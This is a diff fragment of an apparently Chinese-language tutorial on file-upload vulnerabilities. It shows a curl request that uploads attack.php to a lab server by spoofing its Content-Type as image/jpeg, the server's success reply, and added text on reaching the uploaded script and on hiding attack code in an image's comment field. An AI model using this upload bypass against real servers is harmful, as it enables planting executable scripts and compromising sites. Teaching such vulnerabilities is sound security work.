@@ -44,8 +44,6 @@ echo "attack success !!!";
 
 。
 
-
-
 ```
 $ curl 'http://192.168.56.101/upload.php'  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCHKmsM8kfbHlN8Ff' --data-binary $'------WebKitFormBoundaryCHKmsM8kfbHlN8Ff\r\nContent-Disposition: form-data; name="uploadedfile"; filename="attack.php"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundaryCHKmsM8kfbHlN8Ff--\r\n'
 
@@ -61,5 +59,7 @@ Array
 上传成功
 ```
 
+，脚本文件被成功上传到服务器上，通过[http://192.168.56.101/uploads/attack.php](http://192.168.56.101/uploads/attack.php)可以访问，从而达到攻击目的，通过这种方式攻击者可以上传任意类型的文件。
 
+​ 上面介绍的是直接将脚本文件未造成图片类型实现攻击，某些情况下还可以将脚本嵌入到图片中，比如我么能通过GIMP随便编辑一张图片，在图片导出时，在Comment字段中添加我们的攻击代码，这样会修改图片的头信息，代码文本嵌入到图片中，但图片还是正常合法的图片。如下图所示：
 
